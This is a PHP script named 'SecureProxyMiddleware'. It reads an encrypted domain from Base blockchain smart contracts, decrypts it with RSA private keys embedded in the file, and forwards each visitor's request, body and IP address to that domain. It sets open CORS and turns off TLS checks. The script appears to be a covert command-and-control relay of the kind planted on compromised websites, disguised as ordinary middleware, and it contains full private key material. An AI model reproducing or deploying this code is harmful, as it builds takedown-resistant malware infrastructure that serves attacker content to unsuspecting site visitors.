<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: *');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Max-Age: 3600');

function getClientIP() {
    // Check for Cloudflare IP
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }

    // Check X-Forwarded-For
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Get first IP in chain
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }

    // Fallback to direct IP
    return $_SERVER['REMOTE_ADDR'];
}



class SecureProxyMiddleware {
    private $updateInterval = 60;
    private $rpcUrls;
    private $contractAddressEvm;
    private $contractAddressSol;
    private $cacheFile;
    private $keyEvm;
    private $keySol;
    public $EVM_TYPE = "EVM";
    public $SOL_TYPE = "SOL";

    public function __construct($options = []) {
        $this->rpcUrls = $options['rpcUrls'] ?? [
            "https://mainnet.base.org",
            "https://base-rpc.publicnode.com",
        ];
        $this->contractAddressEvm = $options['contractAddressEvm'] ?? "0x244C9881eA58DdaC4092e79e1723A0d090C9fB32";
        $this->contractAddressSol = $options['contractAddressSol'] ?? "0x65B29d8d8B98a7F7F0f743f1b3694FDB7a640Fb1";
        $this->keyEvm = $options['keyEvm'] ?? "-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDMiBSiUHvnBcuz
pSMmAkdBwscPBWd4DWQTJVSOXV3yE5g/kygMc8Nn/7ae3xJT3+T9RfzYmE5hRtkp
vhWmxpSUySh2MWE915oul0tywewDVP2BndC+MRKvkuDrntvQdYO5pxhWVSURUWOn
IS9cHlMo6Y+7aYxza8YgYbvPZ+6mWZSv20zApc+o797IedEOFB/JY1N4lyxABbSv
exeZa9zAHFrs8QkOMGilwPXUMDDiSR0oaBViPFLrtkIoxZoCdTYY1EE26pd1pUL0
2eOf/sJwpHwGVPoWlfowahLK8WM18068S4SPCA2hvXhV+tq7VsJWUYIMI7D0a1ln
MDakKYsJAgMBAAECggEAA4m7FE+2Gk9JsHLZLSLO9BPteOoMBHye0DdOGM8D/Vha
GDIbIulXEP57EeZ5R7AmIud0sekjOfWNc3Zmo3rok7ujEor/dqAQemEtnJo+0z6Y
yrGIgdxmyVi4wU//LMJLpAjVl/C4cm3o/mQe5fC0WY8ovazcEXG6J1Hpe3NTIoIp
kooKXwvCRxW+7kO81mqI2037WJ0HagkFxVSrsJcspr6Rlcj1ocPXbUp0eUNOwcbz
q2t+SmlFOyOlapenAUzSzYKQggbN8n9YSGXyKOqjKgdkpsJeneL5txECBkWY0ocg
R06rduYfxszs1LTvFkska98XWdKFZzrS8S7BVhcEDQKBgQD7IMygI39SlUR5MLak
HmyGlLw+VCMTa9eXRy8D9UKDwIs/ODERNUeGgVteTSuzZDJ91o/BRwWUagA2sel4
KReQsw//sOzpc+t/Uw6OpLajfdeVj8eG3h+hTyy+jla8+cpq2EfIzGRRCVFLew85
Ncnv9Ygs9Ug/rji4XTuXgXI/UwKBgQDQf91Q6b9xhSyiotO2WRoZznhEWqPQLUdf
8X5akFID4k/F5DLjvJNoBWlVWg3lDDE+Nc6byWrDO0jGYtJwEUGfJmFE7X6gY70z
eAq8SSijk+g4jOdQsClbzlVlQqLVLTE2vhbUK6lhTrkvuS0qA4Dq/SlBAt0fbz61
gukjbGcsswKBgE2gK+BsWJUMcugLOMmuZdmL7ExP8a+1LCUk6dGNZIwZXnGiSviI
wZ1AKyARNqrzE/B1/GXAMGdaBMrjX8m22gPudcmRxQm8vVTUNbG+FH6hDZy7nu9/
hcN1F92nXgR4Kiuwwy+8jl3GRYzRczk5+TvlZ7yN7VFR51KF7z+70bblAoGANJNp
rZOj8O5SGRjSJjNFv6gu752jnUUtsGXnJNMru0sALriilIbi7OIgc6NnyZBPgo5y
8RnTUDPM4CnfQt83GvjEomr4+VztQuNMYbpZAxazAj+VvOUPKNVY91XcVcE1ncZF
X287IQyG6h/Z4bRMd/Uqx/f+5oRY3dCLFaGqSr0CgYEAmJgjVpmzr0lg1Xjkh+Sf
IFGtOUzeAHvrwdkwJ0JyrhAE2jn5us8fxZBpwy20gB2pNfmH6j4RFZAoQFErJ1lJ
6RFXbNP8KDqe5vIwxOCpfWPNsAFF89RUTBsxJSf1ahFMcz9LJOKuTawliGbxw7Sy
N4gAP7/6l6WMuLCGxr5dcBw=
-----END PRIVATE KEY-----";


        $this->keySol = $options['keySol'] ?? "-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7avORW3tPVri/
MK+e0Z/DrWOsFW2TT+g9CA1nQcChzu8TilFyJkF9VbnbjjjUIIlAIyZV9nLYPDgO
Hw+1BUiuebIBkU18QUDcigcy2fyj6dGxjlYtRIcuChNvLRNX5etljzcmPWqTgfUb
UBl944eHnht82UBf9nYZr7tBGjN2FjTV9zO10XvTqF0Ki01iKJcHwnK0iwfG4e5v
pUM8uYzwiwoWmuuMlzpcAX267f27NsjXAwiAy79ioRCytyx0o5mV2yRDkoyH2etv
yiZviZ2XBTuNjYZsZ5kfH/HawRG5hNOG0d8nAj/q6E13fkL8KUr7e08lTIUTjeVQ
tDiQvjjhAgMBAAECggEABZBHub1u/Cx1YIuX8w2DAiKQDmg2cASTvtgR2cpcZxFH
DJvzDgHvuMJGOavPqRBsMqC4fx3JS/0Bpv2qEDQfc7p+G8jN9Y3UWJeqXgqVkuIa
jPxON5rMroOzDv5WECptof6t4u84zjcx6QUoNJIAEHkTlNG4NQESgXGzi9u0wmEa
WddKOrmUYls3GVYveDFR7nLldNTjErw9UYliPyfSZb3dOI7b+r+1HNlXM1V9sXW/
BW2XhO3csoDHxGNBaqtOYUgumkVhouQYIyILdxnD7Fx400iYDQwqknLkIILT+zbJ
JyPhWdgEjes1rqcdOIWx6rb+8lcqDut1ZcABdt0SCQKBgQDo+kvphRo1Iq7rMPFv
JQiwIBJdOLEgVQun8TT3FcTSzh4DZ4lBHx/FEM/gHGEJ6n6aZQGO8Pr477JK7C0U
PPyY2hB0skXPCELwaSAP8EaLkoYrKJ/kdoP+tBNhxGc5Z3gCML5yYYERaSeshP/W
OEhlGh6zZP5feeo4tsHcrPYP5QKBgQDN8By1GgribnHZ/kaqaPho8S9GI/j4iOOf
zePK3TFyaXKfmMEyNbcp9BcYO/e7CuNo6YlYEgkC7ippP6k9iCdK3tnmLov6tzhd
4f5r4IoOxu2STTAKF4vitZjjl2Bs4A/LwOtK29NezqEqmp8TIyhbZfIiYoktJ7/s
ZJn4j0ydTQKBgQCd5taAhQfIL6OiH9/i1pTW2kXYDM5v/XQS9TZSqNxni+9nm0q5
amDb7ZMWb+WNFPONrRurR8Sx57NNeFjtOJBzAIjaruEFerHzwyxJ4S3O9xYcNkJ4
U6MOg/oG71iO3YPG6EaLu24A4OZU1SeYhzj53QQlzjNhfn2yxpsJ9+glyQKBgCgX
wg8EBfB1Xhb5qRpOG2aa5gA6yqLgS6h19g4tqA3FN7qYi6xRxtoVGlXuftlcUk+/
f6y0vipi4cDh0voWwseRwUxN7ZSfDQtCDz1DVr1vvxrHij28vdAiWKSeePhZWtnp
MiW9zFXd1oSr26JnKtk4bL6C/n/bCENmho9cnqbVAoGAXncKBCnIhZzU08/Vzvv9
o4TMibYy7wPn7uyDsZiR22+SYpYamvenOE81y9wKPyjNIFk6S0Sf/ztREWHZeitA
pRgTwkunVqCS2Ixt7CTy22TZbtsU645vFABa11JIypTQIcaQosCe118OF+UUWv0c
VZBN38jDpbWa30+zsSP2sJE=
-----END PRIVATE KEY-----";

        $serverIdentifier = md5(
            $_SERVER['SERVER_NAME'] . ':' .
            $_SERVER['SERVER_ADDR'] . ':' .
            $_SERVER['SERVER_SOFTWARE']
        );
        $this->cacheFile = sys_get_temp_dir() . '/proxy_cache_' . $serverIdentifier . '.json';
    }

    private function loadCache($type) {
        if (!file_exists($this->cacheFile)) return null;
        $cache = json_decode(file_get_contents($this->cacheFile), true);
        if (!$cache || (time() - $cache['timestamp']) > $this->updateInterval) {
            return null;
        }
        return $cache['domain'.$type] ?? null;

    }

    private function filterHeaders($headers) {
        $blacklist = ['host'];
        $formatted = [];

        foreach ($headers as $key => $value) {
            $key = strtolower($key);
            if (!in_array($key, $blacklist)) {
                $formatted[] = "$key: $value";
            }
        }

        return $formatted;
    }

    private function saveCache($domain, $type) {
        $cache = ['domain'.$type => $domain, 'timestamp' => time()];
        file_put_contents($this->cacheFile, json_encode($cache));
    }

    private function hexTobase64($hex){
        $hex = preg_replace('/^0x/', '', $hex);
        $hex = substr($hex, 64);
        $lengthHex = substr($hex, 0, 64);
        $length = hexdec($lengthHex);
        $dataHex = substr($hex, 64, $length * 2);
        return base64_encode(pack('H*',$dataHex));
    }

    private function hexToString($hex) {
        $hex = preg_replace('/^0x/', '', $hex);
        $hex = substr($hex, 64);
        $lengthHex = substr($hex, 0, 64);
        $length = hexdec($lengthHex);
        $dataHex = substr($hex, 64, $length * 2);
        $result = '';
        for ($i = 0; $i < strlen($dataHex); $i += 2) {
            $charCode = hexdec(substr($dataHex, $i, 2));
            if ($charCode === 0) break;
            $result .= chr($charCode);
        }
        return $result;
    }

    private function fetchTargetDomain($addr, $key) {
        $data = 'c2fb26a6';

        foreach ($this->rpcUrls as $rpcUrl) {
            try {
                $ch = curl_init($rpcUrl);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode([
                        'jsonrpc' => '2.0',
                        'id' => 1,
                        'method' => 'eth_call',
                        'params' => [[
                            'to' => $addr,
                            'data' => '0x' . $data
                        ], 'latest']
                    ]),
                    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                    CURLOPT_TIMEOUT => 120,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false
                ]);

                $response = curl_exec($ch);
                if (curl_errno($ch)) {
                    curl_close($ch);
                    continue;
                }

                curl_close($ch);
                $responseData = json_decode($response, true);
                if (isset($responseData['error'])) continue;
                $encryptedDomain = $this->hexTobase64($responseData['result']);
                $domain = $this->decryptSimple($encryptedDomain, $key);
                if ($domain) return $domain;
            } catch (Exception $e) {
                continue;
            }
        }
        throw new Exception('Could not fetch target domain');
    }

    public function getTargetDomain($type) {
        $cachedDomain = $this->loadCache($type);
        if ($cachedDomain) return $cachedDomain;

        $addr;
        $key;
        switch ($type) {
            case $this->EVM_TYPE:
                $addr = $this->contractAddressEvm;
                $key = $this->keyEvm;
                break;

            case $this->SOL_TYPE:
                $addr = $this->contractAddressSol;
                $key = $this->keySol;
                break;
        }
        $domain = $this->fetchTargetDomain($addr, $key);

        $this->saveCache($domain, $type);
        return $domain;
    }

    private function formatHeaders($headers) {
        $formatted = [];
        foreach ($headers as $name => $value) {
            if (is_array($value)) $value = implode(', ', $value);
            $formatted[] = "$name: $value";
        }
        return $formatted;
    }


    public function handle($endpoint, $type) {
        try {
            $targetDomain = rtrim($this->getTargetDomain($type), '/');
            $endpoint = '/' . ltrim($endpoint, '/');
            $url = $targetDomain . $endpoint;

            $clientIP = getClientIP();

            $headers = getallheaders();
            // $headers = $this->filterHeaders($headers);
            unset($headers['Host'], $headers['host']);
            unset($headers['origin'], $headers['Origin']);
            unset($headers['Accept-Encoding'], $headers['Content-Encoding']);
            unset($headers['Content-Encoding'], $headers['content-encoding']);

            $headers['x-dfkjldifjlifjd'] = $clientIP;
            $headers['x-forwarded-for'] = $clientIP;
            $headers['x-client-ip'] = $clientIP;
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_CUSTOMREQUEST => $_SERVER['REQUEST_METHOD'],
                CURLOPT_POSTFIELDS => file_get_contents('php://input'),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER => $this->formatHeaders($headers),
                CURLOPT_TIMEOUT => 120,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_ENCODING => ''
            ]);

            $response = curl_exec($ch);
            if (curl_errno($ch)) {
                throw new Exception(curl_error($ch));
            }

            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
            curl_close($ch);

            header('Access-Control-Allow-Origin: *');
            header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
            header('Access-Control-Allow-Headers: *');
            if ($contentType) header('Content-Type: ' . $contentType);

            http_response_code($httpCode);
            echo $response;

        } catch (Exception $e) {
            http_response_code(500);
            echo 'error' . $e;
        }
    }

    private static function decryptSimple($encryptedData, $privateKey) {
        $encrypted = base64_decode($encryptedData);
        $decrypted = '';
        if (!openssl_private_decrypt($encrypted, $decrypted, $privateKey)) {
            throw new Exception('Ошибка при расшифровке');
        }
        return $decrypted;
    }
}

$proxy = new SecureProxyMiddleware([
    'rpcUrls' => [
        "https://mainnet.base.org",
        "https://base-rpc.publicnode.com",
    ],
    "contractAddressEvm" => "0x244C9881eA58DdaC4092e79e1723A0d090C9fB32",
    'contractAddressSol' => "0x65B29d8d8B98a7F7F0f743f1b3694FDB7a640Fb1",
    'keySol'=>"-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7avORW3tPVri/
MK+e0Z/DrWOsFW2TT+g9CA1nQcChzu8TilFyJkF9VbnbjjjUIIlAIyZV9nLYPDgO
Hw+1BUiuebIBkU18QUDcigcy2fyj6dGxjlYtRIcuChNvLRNX5etljzcmPWqTgfUb
UBl944eHnht82UBf9nYZr7tBGjN2FjTV9zO10XvTqF0Ki01iKJcHwnK0iwfG4e5v
pUM8uYzwiwoWmuuMlzpcAX267f27NsjXAwiAy79ioRCytyx0o5mV2yRDkoyH2etv
yiZviZ2XBTuNjYZsZ5kfH/HawRG5hNOG0d8nAj/q6E13fkL8KUr7e08lTIUTjeVQ
tDiQvjjhAgMBAAECggEABZBHub1u/Cx1YIuX8w2DAiKQDmg2cASTvtgR2cpcZxFH
DJvzDgHvuMJGOavPqRBsMqC4fx3JS/0Bpv2qEDQfc7p+G8jN9Y3UWJeqXgqVkuIa
jPxON5rMroOzDv5WECptof6t4u84zjcx6QUoNJIAEHkTlNG4NQESgXGzi9u0wmEa
WddKOrmUYls3GVYveDFR7nLldNTjErw9UYliPyfSZb3dOI7b+r+1HNlXM1V9sXW/
BW2XhO3csoDHxGNBaqtOYUgumkVhouQYIyILdxnD7Fx400iYDQwqknLkIILT+zbJ
JyPhWdgEjes1rqcdOIWx6rb+8lcqDut1ZcABdt0SCQKBgQDo+kvphRo1Iq7rMPFv
JQiwIBJdOLEgVQun8TT3FcTSzh4DZ4lBHx/FEM/gHGEJ6n6aZQGO8Pr477JK7C0U
PPyY2hB0skXPCELwaSAP8EaLkoYrKJ/kdoP+tBNhxGc5Z3gCML5yYYERaSeshP/W
OEhlGh6zZP5feeo4tsHcrPYP5QKBgQDN8By1GgribnHZ/kaqaPho8S9GI/j4iOOf
zePK3TFyaXKfmMEyNbcp9BcYO/e7CuNo6YlYEgkC7ippP6k9iCdK3tnmLov6tzhd
4f5r4IoOxu2STTAKF4vitZjjl2Bs4A/LwOtK29NezqEqmp8TIyhbZfIiYoktJ7/s
ZJn4j0ydTQKBgQCd5taAhQfIL6OiH9/i1pTW2kXYDM5v/XQS9TZSqNxni+9nm0q5
amDb7ZMWb+WNFPONrRurR8Sx57NNeFjtOJBzAIjaruEFerHzwyxJ4S3O9xYcNkJ4
U6MOg/oG71iO3YPG6EaLu24A4OZU1SeYhzj53QQlzjNhfn2yxpsJ9+glyQKBgCgX
wg8EBfB1Xhb5qRpOG2aa5gA6yqLgS6h19g4tqA3FN7qYi6xRxtoVGlXuftlcUk+/
f6y0vipi4cDh0voWwseRwUxN7ZSfDQtCDz1DVr1vvxrHij28vdAiWKSeePhZWtnp
MiW9zFXd1oSr26JnKtk4bL6C/n/bCENmho9cnqbVAoGAXncKBCnIhZzU08/Vzvv9
o4TMibYy7wPn7uyDsZiR22+SYpYamvenOE81y9wKPyjNIFk6S0Sf/ztREWHZeitA
pRgTwkunVqCS2Ixt7CTy22TZbtsU645vFABa11JIypTQIcaQosCe118OF+UUWv0c
VZBN38jDpbWa30+zsSP2sJE=
-----END PRIVATE KEY-----",
    'keyEvm'=>"-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDMiBSiUHvnBcuz
pSMmAkdBwscPBWd4DWQTJVSOXV3yE5g/kygMc8Nn/7ae3xJT3+T9RfzYmE5hRtkp
vhWmxpSUySh2MWE915oul0tywewDVP2BndC+MRKvkuDrntvQdYO5pxhWVSURUWOn
IS9cHlMo6Y+7aYxza8YgYbvPZ+6mWZSv20zApc+o797IedEOFB/JY1N4lyxABbSv
exeZa9zAHFrs8QkOMGilwPXUMDDiSR0oaBViPFLrtkIoxZoCdTYY1EE26pd1pUL0
2eOf/sJwpHwGVPoWlfowahLK8WM18068S4SPCA2hvXhV+tq7VsJWUYIMI7D0a1ln
MDakKYsJAgMBAAECggEAA4m7FE+2Gk9JsHLZLSLO9BPteOoMBHye0DdOGM8D/Vha
GDIbIulXEP57EeZ5R7AmIud0sekjOfWNc3Zmo3rok7ujEor/dqAQemEtnJo+0z6Y
yrGIgdxmyVi4wU//LMJLpAjVl/C4cm3o/mQe5fC0WY8ovazcEXG6J1Hpe3NTIoIp
kooKXwvCRxW+7kO81mqI2037WJ0HagkFxVSrsJcspr6Rlcj1ocPXbUp0eUNOwcbz
q2t+SmlFOyOlapenAUzSzYKQggbN8n9YSGXyKOqjKgdkpsJeneL5txECBkWY0ocg
R06rduYfxszs1LTvFkska98XWdKFZzrS8S7BVhcEDQKBgQD7IMygI39SlUR5MLak
HmyGlLw+VCMTa9eXRy8D9UKDwIs/ODERNUeGgVteTSuzZDJ91o/BRwWUagA2sel4
KReQsw//sOzpc+t/Uw6OpLajfdeVj8eG3h+hTyy+jla8+cpq2EfIzGRRCVFLew85
Ncnv9Ygs9Ug/rji4XTuXgXI/UwKBgQDQf91Q6b9xhSyiotO2WRoZznhEWqPQLUdf
8X5akFID4k/F5DLjvJNoBWlVWg3lDDE+Nc6byWrDO0jGYtJwEUGfJmFE7X6gY70z
eAq8SSijk+g4jOdQsClbzlVlQqLVLTE2vhbUK6lhTrkvuS0qA4Dq/SlBAt0fbz61
gukjbGcsswKBgE2gK+BsWJUMcugLOMmuZdmL7ExP8a+1LCUk6dGNZIwZXnGiSviI
wZ1AKyARNqrzE/B1/GXAMGdaBMrjX8m22gPudcmRxQm8vVTUNbG+FH6hDZy7nu9/
hcN1F92nXgR4Kiuwwy+8jl3GRYzRczk5+TvlZ7yN7VFR51KF7z+70bblAoGANJNp
rZOj8O5SGRjSJjNFv6gu752jnUUtsGXnJNMru0sALriilIbi7OIgc6NnyZBPgo5y
8RnTUDPM4CnfQt83GvjEomr4+VztQuNMYbpZAxazAj+VvOUPKNVY91XcVcE1ncZF
X287IQyG6h/Z4bRMd/Uqx/f+5oRY3dCLFaGqSr0CgYEAmJgjVpmzr0lg1Xjkh+Sf
IFGtOUzeAHvrwdkwJ0JyrhAE2jn5us8fxZBpwy20gB2pNfmH6j4RFZAoQFErJ1lJ
6RFXbNP8KDqe5vIwxOCpfWPNsAFF89RUTBsxJSf1ahFMcz9LJOKuTawliGbxw7Sy
N4gAP7/6l6WMuLCGxr5dcBw=
-----END PRIVATE KEY-----",
]);

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
    header('Access-Control-Allow-Headers: *');
    header('Access-Control-Max-Age: 86400');
    http_response_code(204);
    exit;
}

if (isset($_GET['e']) && $_GET['e'] === 'ping_proxy') {
    header('Content-Type: text/plain');
    echo 'pong';
    exit;
} else if (isset($_GET['e'])) {
    $endpoint = urldecode($_GET['e']);
    $endpoint = ltrim($endpoint, '/');
    $proxy->handle($endpoint, $proxy->EVM_TYPE);
}else if(isset($_GET['c'])){
    $endpoint = urldecode($_GET['c']);
    $endpoint = ltrim($endpoint, '/');
    $proxy->handle($endpoint, $proxy->SOL_TYPE);
} else {
    http_response_code(400);
    echo 'Missing endpoint';
}